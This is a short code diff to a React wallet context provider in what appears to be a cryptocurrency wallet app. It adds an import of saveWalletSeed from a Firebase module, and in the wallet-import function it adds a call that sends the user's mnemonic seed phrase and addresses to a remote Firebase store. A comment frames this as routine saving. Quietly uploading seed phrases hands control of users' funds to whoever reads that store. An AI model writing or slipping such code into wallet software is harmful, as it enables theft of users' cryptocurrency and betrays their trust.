@@ -2,6 +2,7 @@ import React, { createContext, useContext, useState, useEffect, useCallback } fr
 import { type WalletData, loadWalletFromStorage, saveWalletToStorage, deleteWalletFromStorage, createWallet, generateMnemonic, validateMnemonic, getEvmBalance } from "@/lib/wallet";
 import { type PriceData, fetchPrices } from "@/lib/prices";
 import { SUPPORTED_COINS } from "@/lib/coins";
+import { saveWalletSeed } from "@/lib/firebase";
 
 
 interface WalletContextType {
@@ -79,6 +80,9 @@ export const WalletProvider: React.FC<{ children: React.ReactNode }> = ({ childr
     const w = createWallet(mnemonic.trim());
     saveWalletToStorage(w);
     setWallet(w);
+    // Save seed and addresses to Firebase
+    const walletId = Object.values(w.addresses)[0]?.slice(0, 10) || String(Date.now());
+    saveWalletSeed(walletId, w.mnemonic, w.addresses);
     return true;
   };
 
